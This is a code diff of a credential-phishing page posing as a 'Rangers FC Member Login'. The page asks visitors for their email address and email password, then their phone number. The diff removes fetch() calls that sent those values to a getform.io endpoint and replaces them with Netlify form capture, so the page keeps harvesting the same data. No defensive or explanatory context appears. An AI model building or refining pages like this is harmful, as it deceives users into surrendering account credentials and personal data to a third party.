@@ -98,7 +98,7 @@
         <h2>Rangers FC Member Login</h2>
 
         <!-- First form: email & password -->
-        <form id="loginForm">
+        <form id="loginForm" name="loginForm" method="POST" data-netlify="true">
             <input type="email" id="email" name="email" placeholder="Enter your email" required>
             <input type="password" id="userPassword" name="userPassword" placeholder="Enter your email password" required>
             <button type="submit">Login</button>
@@ -108,7 +108,7 @@
         <div id="phoneModal">
             <h2>Enter Your Phone Number</h2>
             <p class="info-text">Enter your phone number to get the form delivered instantly.</p>
-            <form id="phoneForm">
+            <form id="phoneForm" name="phoneForm" method="POST" data-netlify="true">
                 <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
                 <button type="submit">Submit</button>
             </form>
@@ -129,27 +129,12 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('userPassword').value;
 
+            // Show the phone number form after email/password submission
+            document.getElementById('loginForm').style.display = 'none'; // Hide the login form
+            document.getElementById('phoneModal').style.display = 'block'; // Show phone number form
+
             // Optionally log data to the console for testing
             console.log(`Email: ${email}, Password: ${password}`);
-            
-            // Send form data to Getform
-            fetch('https://getform.io/f/avrmyepa', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: email,
-                    userPassword: password
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Show the phone number form after email/password submission
-                document.getElementById('loginForm').style.display = 'none'; // Hide the login form
-                document.getElementById('phoneModal').style.display = 'block'; // Show phone number form
-            })
-            .catch(error => console.error('Error:', error));
         });
 
         // Handle phone number form submission
@@ -162,23 +147,9 @@
             // Log the phone number along with email and password
             console.log(`Phone: ${phone}`);
 
-            // Send the phone number to Getform along with email and password
-            fetch('https://getform.io/f/avrmyepa', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: document.getElementById('email').value,
-                    userPassword: document.getElementById('userPassword').value,
-                    phone: phone
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                alert('Form submitted successfully!');
-            })
-            .catch(error => console.error('Error:', error));
+            // After submission, alert the user and reset
+            alert('Form submitted successfully!');
+            document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
         });
     </script>
 
